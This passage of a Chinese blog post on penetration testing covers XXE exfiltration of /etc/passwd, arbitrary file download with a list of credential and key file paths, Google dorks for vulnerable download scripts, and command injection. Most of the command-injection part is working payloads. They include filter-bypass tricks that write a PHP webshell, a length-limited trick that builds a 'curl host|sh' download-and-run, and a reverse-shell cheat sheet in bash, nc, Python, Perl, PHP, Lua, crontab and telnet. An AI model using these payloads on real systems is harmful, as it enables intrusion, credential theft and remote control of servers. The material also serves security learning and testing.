+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//localhost为本地服务器 melon为远端服务器</span><br><span class="line">1.localhost 解析了 XML，并将%dtd;求值为 melon 的服务器的外部调用。</span><br><span class="line">2.melon 的服务器向 localhost 返回了xxe.dtd文件。</span><br><span class="line">3.localhost 解析了收到的 DTD文件，它触发了%all;的调用。</span><br><span class="line">4.当%all;求值时，它定义了&amp;send;，它包含%file;实体的调用。</span><br><span class="line">5.%file;在 URL 值中被替换为/etc/passwd文件的内容。</span><br><span class="line">6.localhost 解析了 XML 文件，发现了&amp;send;实体，它求值为 melon 服务器的远程调用，带有melon.txt的内容，作为 URL 中的参数。</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7.任意文件下载"></a>7.任意文件下载</h3><p><strong>漏洞形成过程</strong></p>
+<p>首先漏洞源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//FileAcquisition.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];  </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);  </span><br><span class="line">    header(<span class="string">'Content-Type: imgage/jpeg'</span>);  </span><br><span class="line">    header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);  </span><br><span class="line">    header(<span class="string">'Content-Lengh: '</span>.filesize($filename));  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file1.png" alt="html">    </p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file2.png" alt="html">    </p>
+<p>跨目录下载：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file3.png" alt="html">    </p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/file4.png" alt="html">    </p>
+<p>说一下敏感文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//Windows下</span><br><span class="line">C:\boot.ini //查看系统版本</span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\Windows\repair\sam //存储系统初次安装的密码</span><br><span class="line">C:\Program Files\mysql\my.ini //Mysql配置</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD //Mysql root</span><br><span class="line">C:\Windows\php.ini //php配置信息</span><br><span class="line">C:\Windows\my.ini //Mysql配置信息</span><br><span class="line">C:\Windows\win.ini //Windows系统的一个基本系统配置文件</span><br><span class="line"></span><br><span class="line">//Linux下</span><br><span class="line">root/.ssh/authorized_keys ////如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去</span><br><span class="line">/root/.ssh/id_rsa //ssh私钥,ssh公钥是id_rsa.pub</span><br><span class="line">/root/.ssh/id_ras.keystore //记录每个访问计算机用户的公钥</span><br><span class="line">/root/.ssh/known_hosts //记录每个访问计算机用户的公钥</span><br><span class="line">/etc/passwd</span><br><span class="line">/etc/shadow //账户密码文件</span><br><span class="line">/etc/my.cnf //mysql配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf //apache配置文件</span><br><span class="line">/root/.bash_history //用户历史命令记录文件</span><br><span class="line">/root/.mysql_history //mysql历史命令记录文件</span><br><span class="line">/proc/mounts //记录系统挂载设备</span><br><span class="line">/porc/config.gz //内核配置文件</span><br><span class="line">/var/lib/mlocate/mlocate.db //全文件路径</span><br><span class="line">/porc/self/cmdline //当前进程的cmdline参数</span><br></pre></td></tr></table></figure>
+
+<p>补：<a href="https://github.com/tdifg/payloads/blob/master/lfi.txt" target="_blank" rel="noopener">大佬搜集的一部分linux的敏感文件路径</a></p>
+<p><strong>漏洞挖掘</strong>：</p>
+<p>可以用Google hack：<code>inurl:&quot;file.php?file=&quot; inurl : readfile.php?file= inurl : download.php?file=</code></p>
+<p>观察页面是否实现这种功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">download.php?path=</span><br><span class="line">download.php?file=</span><br><span class="line">down.php?file=</span><br><span class="line">data.php?file=</span><br><span class="line">readfile.php?file=</span><br><span class="line">read.php?filename=</span><br></pre></td></tr></table></figure>
+
+<p>观察链接参数名路径名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&amp;RealPath= &amp;FilePath= &amp;ﬁlepath= &amp;Filepath= &amp;Path= &amp;path= &amp;inputFile= &amp;Inputfile= &amp;url= &amp;urls= &amp;Lang= &amp;dis= &amp;data= &amp;Data= &amp;readﬁle= &amp;ﬁlep= &amp;src= &amp;menu=</span><br><span class="line"></span><br><span class="line">//java的重要路径</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
+
+<p>Linux下一种思路：在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。可以算是一个杀器吧。</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/locate.png" alt="html">    </p>
+<h3 id="8-远程代码或系统命令执行-RCE"><a href="#8-远程代码或系统命令执行-RCE" class="headerlink" title="8.远程代码或系统命令执行(RCE)"></a>8.远程代码或系统命令执行(RCE)</h3><p>首先我们了解一下命令拼接符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;        第一个命令执行成功才会执行第二个命令否则不能继续执行</span><br><span class="line">&amp;		 即使第一个command1没有执行成功，也会执行command2 执行成功则都执行</span><br><span class="line">|    	 不管command1是否执行成功，都执行command2，不返回command1的结果 上一条命令的输出，作为下一条命令参数</span><br><span class="line">|| 		 表示上一条命令执行失败后，才执行下一条命令</span><br><span class="line">;		 分号表示命令依次执行。</span><br><span class="line"></span><br><span class="line">linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</span><br><span class="line">windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure>
+
+<p>这里我们以DVWA为例代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    $target = $_POST[ <span class="string">'ip'</span> ];</span><br><span class="line">    <span class="comment">//下面判断系统</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Unix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DVWARCE.png" alt="html">    </p>
+<p><strong>空格绕过</strong></p>
+<p>Linux不能使用空格时的一些绕过 例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS&quot;&lt;?php system($_GET[x]);?&gt;&quot;&gt;shell.php  </span><br><span class="line">//$IFS$9,$&#123;IFS&#125;，$IFS 都可以 $IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/IFS.png" alt="html">    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;echo,&apos;Melon&apos;&#125;&gt;test.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/wshell.png" alt="html"></p>
+<p><strong>黑名单拼接绕过</strong></p>
+<p><code>a=l;b=s;$a$b</code></p>
+<p><strong>黑名单编码绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">base64:</span><br><span class="line">echo &quot;bWVsb24K&quot;|base64 -d 其将会打印melon //echo &quot;字符串&quot; |base 则是直接加密</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash //等同于 cat /flag</span><br><span class="line"></span><br><span class="line">HEX:</span><br><span class="line">echo &quot;melon&quot; | xxd</span><br><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash</span><br><span class="line"></span><br><span class="line">oct:</span><br><span class="line">$(printf &quot;\154\163&quot;) //ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) //cat /flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 //cat /flag</span><br><span class="line">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br><span class="line"></span><br><span class="line">单引号和双引号绕过:</span><br><span class="line">例：ca&apos;&apos;t flag 或 ca&quot;&quot;t flag</span><br><span class="line"></span><br><span class="line">反斜杠绕过:</span><br><span class="line">比如：ca\t fl\ag</span><br><span class="line"></span><br><span class="line">利用Shell 特殊变量绕过:</span><br><span class="line">//n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。</span><br><span class="line">ca$@t fla$@g</span><br><span class="line">ca$1t fla$2g</span><br></pre></td></tr></table></figure>
+
+<p><strong>长度限制绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">需要用的知识点:</span><br><span class="line">linux下可以用 &gt;a 创建文件名为a的空文件 // &gt;是覆盖 &gt;&gt;是追加 我们一行一行写肯定选择追加</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中 //我们需要反着写也就是从构造好的payload的下面写到上面</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br><span class="line">在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 &quot;\&quot;，可以将一条命令写在多行</span><br></pre></td></tr></table></figure>
+
+<p>测试在文本里内容如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//melon.txt 真实的话文件名要改成 a 因为是绕长度限制</span><br><span class="line">ec\</span><br><span class="line">ho \</span><br><span class="line">hello \</span><br><span class="line">world!</span><br></pre></td></tr></table></figure>
+
+<p>执行：<code>sh melon.txt</code></p>
+<p>那怎样将内容输出到文本当中就是我们需要做的事 </p>
+<p>下面是我们的解决方案：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; &quot;rld&quot;</span><br><span class="line">&gt; &quot;wo\\&quot;</span><br><span class="line">&gt; &quot;llo \\&quot;</span><br><span class="line">&gt; &quot;he\\&quot;</span><br><span class="line">&gt; &quot;echo \\&quot;</span><br><span class="line">ls -t &gt; _</span><br><span class="line">sh _</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8B%BC%E6%8E%A5hello.png" alt="html"></p>
+<p>第一行显示找不到因为先创建 _ 文件再进行输出到_文件里。</p>
+<p>这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令</p>
+<p>这方面也有对应的CTF题目 源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    $sandbox = <span class="string">'/var/www/html/sandbox/'</span>.md5(<span class="string">"orange"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>哪可不可以利用这种方法反弹shell呢？当然是可以的具体操作如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/监听的端口 0&gt;&amp;1 //标准的反弹shell命令</span><br><span class="line">&gt;\ \\</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们遇到了两个个问题 </p>
+<p>其一：<code>ls -t&gt;_</code> 也就是当我们吧文件全部创建好按时间将文件名输入到a文件中时发现我们的命令是七个字符我们需要一个先把这条命令写出来才行</p>
+<p>其二：执行命令需要空格 但是我们需要两个空格 相同的文件怎么可以创建两个呢 这时候可以用 <code>curl url|sh</code> 的方式 只需要再服务器上构建好payload就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">解决问题一</span><br><span class="line">&gt;ls\\ //创建 &quot;ls\&quot; 文件</span><br><span class="line">ls&gt;_  //将ls的排序写入&quot;_&quot;文件 此时文件内容为 &quot;_ ls\&quot;</span><br><span class="line">&gt;\ \\ //创建 &quot; \&quot;文件</span><br><span class="line">&gt;-t\\ //创建&quot;-t\&quot;文件</span><br><span class="line">&gt;\&gt;y  //创建&quot;&gt;y&quot;文件</span><br><span class="line">// ls命令排序的规则是空格和符号最前，数字其次，字母最后</span><br><span class="line">ls&gt;&gt;_ //将ls的排序追加到&quot;_&quot;文件</span><br><span class="line">//ls排序结果如下：</span><br><span class="line">&quot; \&quot;  &quot;_&quot;  &quot;ls\&quot;  &quot;-t\&quot; &quot;&gt;y&quot;</span><br><span class="line">追加之后&quot;_&quot;的内容为：</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">\</span><br><span class="line">_</span><br><span class="line">ls\</span><br><span class="line">-t\</span><br><span class="line">&gt;y</span><br><span class="line">执行:sh _ 生成一个m文件</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们需要sh m 其中 m 中包含了 curl xx.xx.xx.xxx|sh</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;x.\\</span><br><span class="line">&gt;xx\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line">//这里有一个坑就是创建文件不能以 .开头 否则为隐藏文件ls -t读取的时候读不到 我也尝试构造&quot;_&quot;的时候添加-a参数来达到目的 但好像不可能的事情 或许也是我没想到 欢迎师傅们提出意见 </span><br><span class="line">//为什么我要说到这里 因为我服务器的IP正好构造的时候会出现同名文件 以点开头构造又没法绕过 用域名云空间Github或者ip的每位全是三位的都可以 方法还是很多的</span><br></pre></td></tr></table></figure>
+
+<p>利用：这时我们用”_”文件生成”y”文件 用y文件查看服务器反弹shell命令通过管道符执行命令 成功反弹shell</p>
+<p><strong>内联执行</strong></p>
+<p>命令替代，大部分Unix shell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。</p>
+<p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a`pwd`&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/neilian.png" alt="html"></p>
+<p><strong>通配符</strong></p>
+<p>[…]<code>表示匹配方括号之中的任意一个字符。
+比如</code>[aeiou]<code>可以匹配五个元音字母，</code>[a-z]`匹配任意小写字母。<br>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p>
+<p><code>{...}</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>{...}</code>依然可以展开。</p>
+<p>测试如下：</p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_1.png" alt="html"></p>
+<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/catsh_2.png" alt="html"></p>
+<p><strong>反弹shell</strong></p>
+<p>bash方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>exec方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
+
+<p>nc方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">本机运行:</span><br><span class="line">nc -l -vv -p port</span><br><span class="line">目标主机:</span><br><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>
+
+<p>python方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Perl</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+
+<p>PHP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>Lua</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br><span class="line">#需要lua socket支持，且lua5.2+不支持luasocket</span><br></pre></td></tr></table></figure>
+
+<p>crontab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">crontab -e编辑当前用户的任务，或者是写到计划任务目录，一般是 /var/spool/cron/ 目录，ubuntu是</span><br><span class="line">/var/spool/cron/crontabs。文件名为用户名root等。下面命令含义是每一分钟执行一次反弹shell命令。</span><br><span class="line"></span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>telnet</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<p><strong>linux中直接查看文件内容的工具</strong></p>
+<p>cat、tac、more、less、head、tail、nl、sed、sort、uniq</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" data-id="ck44ba0nt0002mguv0vth8dhj"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshll/" rel="tag">webshll</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag">中间件</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%85%E5%90%AB/" rel="tag">包含</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="tag">未授权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%84%E9%9C%B2/" rel="tag">泄露</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+    
+      <a href="/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-nav-link">
+        <strong class="article-nav-caption">后一篇</strong>
+        <div class="article-nav-title">渗透测试之信息收集</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Melon</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
